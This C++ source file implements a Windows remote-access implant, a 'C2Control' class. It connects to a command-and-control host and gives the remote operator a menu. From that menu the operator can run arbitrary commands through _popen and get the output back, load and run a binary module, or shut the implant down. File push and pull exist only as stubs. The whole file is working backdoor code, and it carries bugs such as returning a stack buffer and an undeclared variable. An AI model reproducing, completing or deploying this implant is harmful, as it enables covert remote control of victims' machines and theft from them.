#include "C2Control.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS 1

bool C2Control::isInitialized() { return initialized; }




void C2Control::handleCommand(char* buf,int buflen)
{
	switch (buf[0])
	{
		case '1': handleCommandShell(); break;
		case '2': executeSingleCMD(); break;
		case '3': handleImportModule(); break;
		case '4': handlePullFile(); break;
		case '5': handlePushFile(); break;
		case '6': shutdown(); break;
		default: return;
	}
	return;
}

void C2Control::handleCommandShell()
{
	send(ConnectSocket, "handleImportModule() called\r\n\r\n", (int)strlen("handleCommandShell() called\r\n\r\n"),0);
	puts("handleCommandShell() called");




	return;
}

void C2Control::executeSingleCMD()
{
	puts("executeSingleCMD() called");
	char result[DEFAULT_BUFLEN] = { 0 };
	int recvCnt = 0;
	send(ConnectSocket, "\r\n[CMD.EXE]>>", (int)strlen("\r\n[CMD.EXE]>>"), 0);
	rcvdCnt = recv(ConnectSocket, result, DEFAULT_BUFLEN, 0);
	if (rcvdCnt == 0)
		return;
	else
	{
		char command[DEFAULT_BUFLEN+2] = { 0 };
		for (int i = 0; i < DEFAULT_BUFLEN+2; i++)
		{
			if (result[i] == 0 || i>= DEFAULT_BUFLEN)
			{	
				command[i] = '\r';
				command[i + 1] = '\n';
				break;
			}
			else
				command[i] = result[i];
		}
		
		rce(command);
		//if (system(command)==0)
			//send(ConnectSocket, "\r\n***Command was a success***\r\n\r\n", (int)strlen("\r\n***Command was a success***\r\n\r\n"), 0);
		//else
			//send(ConnectSocket, "\r\n***Command returned with non-zero status code***\r\n\r\n", (int)strlen("\r\n***Command returned with non-zero status code***\r\n\r\n"), 0);
	}
	return;
}

void C2Control::rce(const char* cmd)
{
	std::array<char, 128> buf;

	std::string out = "";
	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
	if (!pipe)
		send(ConnectSocket, "error with rce module\r\n", (int)strlen("error with rce module\r\n"), 0);
	else
	{
		while (fgets(buf.data(), buf.size(), pipe.get()) != nullptr)
			out += buf.data();
		const char* response = out.c_str();
		send(ConnectSocket, response, (int)strlen(response), 0);
	}
}

void C2Control::handleImportModule()
{
	send(ConnectSocket, "handleImportModule() called\r\n\r\n", (int)strlen("handleImportModule() called\r\n\r\n"), 0);
	puts("handleImportModule() called");
	BinaryExecutor* be = new BinaryExecutor(exeptr);
	if (be->isSuccess())
		puts("it worked");
	else
		puts("it failed");
	return;
}

void C2Control::handlePullFile()
{
	send(ConnectSocket, "handlePullFile() called\r\n\r\n", (int)strlen("handleImportModule() called\r\n\r\n"), 0);
	puts("handlePullFile() called");
	return;
}

void C2Control::handlePushFile()
{
	send(ConnectSocket, "OK\r\n", (int)strlen("OK\r\n"), 0);
	puts("handlePushFile() called");

	return;
}

void C2Control::handleUnrecognizedCommand()
{
	send(ConnectSocket, "Received unrecognized command.  Ignoring.\r\n\r\n", (int)strlen("Received unrecognized command.  Ignoring.\r\n\r\n"), 0);
	puts("Received unrecognized command.  Ignoring.");
	return;
}

bool C2Control::sockInit(WSADATA &sData)
{
	if (!WSAStartup(MAKEWORD(2, 2), &sData))
	{
		initHints();
		return true;
	}
	printf("Fatal on initialize().  Can not continue.\n");
	return false;
}

bool C2Control::findHost()
{
	
	if (!getaddrinfo(c2Host, c2Port, &hints, &result))
		return true;
	printf("Fatal error locating c2 host.  Can not continue.\n");
	return false;
}

bool C2Control::test()
{
	if (send(ConnectSocket,"\r\n\r\n", (int)strlen("\r\n\r\n"), 0) == SOCKET_ERROR)
	{
		printf("Test packet failed:: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return false;
	}
	return true;
}

void C2Control::initHints()
{
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
}

void C2Control::shutdown()
{
	puts("\r\nHangup command received from server.  Shutting down.");
	closesocket(ConnectSocket);
	WSACleanup();
	exit(0);
	return;
}




void C2Control::ioLoop()
{
	char buf[DEFAULT_BUFLEN];
	int rcvdCnt = 0;
	BOOL testval = TRUE;
	do {
		if (send(ConnectSocket, draftMenu(), (int)strlen(draftMenu()), 0) != SOCKET_ERROR)
		{
			ZeroMemory(buf, DEFAULT_BUFLEN);
			rcvdCnt = recv(ConnectSocket, buf, DEFAULT_BUFLEN, 0);
			if (rcvdCnt > 0)
			{

				initialized = true;
				printf("Bytes received: %d\n", rcvdCnt);
				puts(buf);
				handleCommand(buf, DEFAULT_BUFLEN);
			}
			else if (rcvdCnt == 0)
				printf("Connection closed\n");
			else
				printf("recv error: %d\n", WSAGetLastError());
		}
	} while (rcvdCnt > 0);
	initialized = false;
}

void C2Control::ParseStringInput(char* buff, const int bufflen, char out[])
{
	ZeroMemory(out, bufflen);
	int index = 0;
	while (buff[index] != '\n' && index < bufflen)
		out[index] = buff[index];
	return;
}

bool C2Control::createSocket()
{
	ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ConnectSocket == INVALID_SOCKET)
	{
		printf("socket creation failed during create socket: %ld\n", WSAGetLastError());
		WSACleanup();
		return false;
	}
	USHORT p = atoi(c2Port);
	
	int result = connect(ConnectSocket, (SOCKADDR*)& addr, sizeof(addr));
	if (result == SOCKET_ERROR)
	{
		printf("failed with error at end of create socket: %ld\n", WSAGetLastError());
		return false;
	}
	return true;
}

C2Control::C2Control(PCSTR host, PCSTR port,const char* ptr):c2Host(host),c2Port(port),ConnectSocket(INVALID_SOCKET),initialized(false),exeptr(ptr)
{
	puts("initializing and testing connection");
	addr.sin_family = AF_INET;
	inet_pton(AF_INET, c2Host, &addr.sin_addr);
	addr.sin_port = htons(atoi(c2Port));
	if (!sockInit(sData) || !findHost() || !createSocket() || !test())
		return;
	puts("conneciton ready running io loop");
	ioLoop();
	return;
}


C2Control::~C2Control()
{
}

char* C2Control::draftMenu()
{
	char menu[2048] = "Remote Access shell is up and running.\r\n\r\nWhat would you like to do?"
						"\r\n\r\n1. Spawn Command Line"
						"\r\n\2. Execute Single Command Via CMD.EXE [Input Only]"
						"\r\n3. Load module"
						"\r\n4. Pull file"
						"\r\n5. Push file"
						"\r\n6. Close"
						"\r\n\r\n>> ";
	return menu;
}


